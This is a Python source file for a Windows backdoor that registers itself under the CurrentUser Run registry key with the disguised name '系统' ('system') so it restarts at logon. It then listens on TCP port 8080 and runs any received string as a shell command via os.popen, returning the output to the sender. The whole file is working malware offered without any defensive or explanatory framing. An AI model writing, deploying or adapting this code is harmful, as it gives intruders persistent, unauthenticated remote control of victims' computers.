import PDTP
import os
import winreg
import threading

def Set_Run():
    File_Addr = os.getcwd() + __file__
    Run_Key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run")
    winreg.SetValue(Run_Key,"系统",winreg.REG_SZ,File_Addr)

def Wait():
    Socket = PDTP.Socket("TCP","UTF-8","GBK")
    Socket.Bind("",8080)
    Socket.Listen(126)

    while(True):
        T_Socket = threading.Thread(target = Request,args = (Socket,))
        T_Socket.start()
      
def Request(Socket):
    while(True):
        Socket.Accept()
        Shell = Socket.Recv(1024)

        if(Shell == "Exit"):
            Socket.Send("Exit")
            break
        
        Response = os.popen(Shell)
        Response = Response.read()
        
        if(Response == ""):
            Socket.Send("Error")
        else:
            Socket.Send(Response)
            
def Main():
    Set_Run()
    Wait()

if(__name__ == "__main__"):
    Main()
